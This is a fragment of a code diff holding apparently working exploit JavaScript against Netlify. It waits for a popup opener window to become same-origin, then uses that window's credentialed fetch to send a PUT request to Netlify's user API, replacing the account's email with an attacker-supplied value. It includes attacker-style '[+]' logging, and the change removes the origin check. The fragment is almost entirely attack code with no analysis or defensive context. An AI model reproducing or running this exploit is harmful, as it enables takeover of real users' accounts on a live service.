@@ -9,7 +9,8 @@
     `window.opener.location.href = ${JSON.stringify(oauthUrl)}`
   );
     
-(async()=>{const o=window.top.opener;console.log("[+] waiting for opener to become same-origin");let n=0;while(o&&!o.closed){try{if(o.location.origin===location.origin){console.log("[+] opener is now same-origin:",o.location.origin);break}}catch{if(n++%10===0)console.log("[.] still cross-origin")}await new Promise(r=>setTimeout(r,100))}if(!o||o.closed)throw Error("opener closed");const email=new URLSearchParams(location.search).get("email");console.log("[+] email parameter:",email);const res=await o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user",{method:"PUT",headers:{"content-type":"application/json"},credentials:"include",body:JSON.stringify({full_name:"hamid hamdad",email,preferred_account_id:""})});console.log("[+] response:",res.status,res.statusText);console.log("[+] body:",await res.clone().text());return res})().catch(e=>console.error("[-]",e))  } else {
+(async()=>{const o=window.top.opener;console.log("[+] waiting for opener to become same-origin");let n=0;while(o&&!o.closed){try{console.log("[+] opener is now same-origin:",o.location.origin);break}catch{if(n++%10===0)console.log("[.] still cross-origin")}await new Promise(r=>setTimeout(r,100))}if(!o||o.closed)throw Error("opener closed");const email=new URLSearchParams(location.search).get("email");console.log("[+] email parameter:",email);const res=await o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user",{method:"PUT",headers:{"content-type":"application/json"},credentials:"include",body:JSON.stringify({full_name:"hamid hamdad",email,preferred_account_id:""})});console.log("[+] response:",res.status,res.statusText);console.log("[+] body:",await res.clone().text());return res})().catch(e=>console.error("[-]",e))  
+} else {
     window.location.assign(oauthUrl);
   }
 })().catch((error) => {
